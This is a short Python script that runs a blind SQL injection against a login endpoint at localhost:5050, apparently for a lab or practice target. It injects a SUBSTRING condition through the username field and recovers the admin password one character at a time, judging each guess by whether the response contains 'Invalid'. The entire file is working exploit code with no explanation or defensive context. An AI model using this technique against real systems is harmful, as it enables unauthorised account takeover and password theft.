import requests

username='admin'
passwordToFind = ''
wordlist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+{}'

def exploiter(string, end):
    goesIn = f"{username}' AND SUBSTRING(password, 1, {end})='{string}' -- "
    r = requests.post('http://localhost:5050/login', data={'username': goesIn, 'password': 'doesn\'t matter'})
    return "Invalid" not in r.text

end=1

while True:
    for char in wordlist: 
        if exploiter(passwordToFind+char, end):
            passwordToFind += char
            end += 1
            print(passwordToFind)
            break